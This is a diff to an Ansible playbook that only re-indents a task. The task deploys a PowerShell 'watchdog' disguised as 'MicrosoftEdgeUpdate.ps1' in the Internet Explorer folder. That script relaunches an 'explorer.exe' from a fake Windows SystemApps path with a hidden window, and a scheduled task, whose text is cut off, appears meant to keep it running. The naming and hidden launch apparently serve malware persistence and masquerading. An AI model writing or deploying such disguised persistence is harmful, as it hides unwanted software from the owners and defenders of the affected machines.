@@ -21,20 +21,20 @@
 
 - name: Deploy watchdog PowerShell script
   ansible.windows.win_copy:
-  dest: "C:\\Program Files\\Internet Explorer\\MicrosoftEdgeUpdate.ps1"
-  content: |
-    $exePath = 'C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\explorer.exe'
-    $processName = 'explorer'
+    dest: "C:\\Program Files\\Internet Explorer\\MicrosoftEdgeUpdate.ps1"
+    content: |
+      $exePath = 'C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\explorer.exe'
+      $processName = 'explorer'
 
-    if (-not (Test-Path $exePath)) {
-        exit 1
-    }
+      if (-not (Test-Path $exePath)) {
+          exit 1
+      }
 
-    $running = Get-Process -Name $processName -ErrorAction SilentlyContinue
+      $running = Get-Process -Name $processName -ErrorAction SilentlyContinue
 
-    if (-not $running) {
-        Start-Process -FilePath $exePath -WindowStyle Hidden
-    }
+      if (-not $running) {
+          Start-Process -FilePath $exePath -WindowStyle Hidden
+      }
 
 - name: Create scheduled task for watchdog
   ansible.windows.win_powershell:
